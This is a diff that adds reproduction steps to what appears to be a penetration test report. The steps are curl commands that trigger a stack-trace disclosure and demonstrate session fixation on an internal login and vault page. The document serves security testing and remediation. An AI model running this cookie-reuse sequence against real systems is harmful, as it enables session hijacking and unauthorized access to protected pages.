@@ -795,6 +795,26 @@ curl -X POST http://10.0.0.10/login \
 
 ---
 
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** Malformed JSON request causing error
+
+**Screenshot 2:** HTTP 400 response with full stack trace
+
+**Screenshot 3:** Exposed internal paths and technology stack
+
+**Command Output:**
+
+```
+curl -X POST http://10.0.0.10/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test","password"}'
+
+Response: HTTP 400 with stack trace revealing /usr/app/node_modules/, Express version, etc.
+```
+
+---
+
 ## Finding 12: Broken Authentication - Session Fixation
 
 **Severity:** MEDIUM (CVSS 6.8)  
@@ -865,6 +885,35 @@ curl http://10.0.0.10/vault \
 
 4. **Add Logout Functionality:**
    - Properly destroy sessions on logout
+
+---
+
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** Pre-login cookie capture
+
+**Screenshot 2:** Login with the same cookie
+
+**Screenshot 3:** Post-login access with old cookie still working
+
+**Command Output:**
+
+```
+# Capture pre-login cookie
+COOKIE=$(curl -I http://10.0.0.10/login 2>&1 | grep 'Set-Cookie' | awk '{print $2}' | cut -d';' -f1)
+
+# Login with the cookie
+curl -X POST http://10.0.0.10/login \
+  -H "Content-Type: application/json" \
+  -H "Cookie: $COOKIE" \
+  -d '{"username":"testuser","password":"password"}'
+
+# Access vault with old cookie - should still work
+curl http://10.0.0.10/vault \
+  -H "Cookie: $COOKIE"
+
+Response: Returns vault page (vulnerable)
+```
 
 ---
 
